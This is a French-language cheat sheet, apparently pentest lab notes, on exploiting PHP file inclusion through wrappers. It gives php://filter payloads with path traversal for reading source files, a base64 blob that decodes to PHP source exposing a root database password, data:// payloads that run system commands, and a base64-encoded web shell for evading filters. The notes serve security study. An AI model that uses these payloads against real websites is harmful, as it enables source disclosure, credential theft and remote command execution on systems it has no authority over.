Les Wrappers :
## Pour encoder en base64 un fichier à lire
```
php://filter/convert.base64-encode/resource=<fichier a lire>

exemple :
 http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 
 ou
  http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php
```

Pour décoder le base64 en ligne de commande :
```
echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
```

## Pour executer une commande et mettre le retour dans la page actuelle

```
data://text/plain,<?php%20echo%20system('<Commande a executer');?>

exemple :
http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>

autre exemple avec une commande ayant un paramètre :
http://mountaindesserts.com//meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>
```

Si par exemple le systeme de protection de la page filtre la commande php système, on peut encoder en base64 le php :
```
$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
La réponse :
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
```
Et envoyer :
```
Le filtre :
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=<commande à envoyer>

exemple :

http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```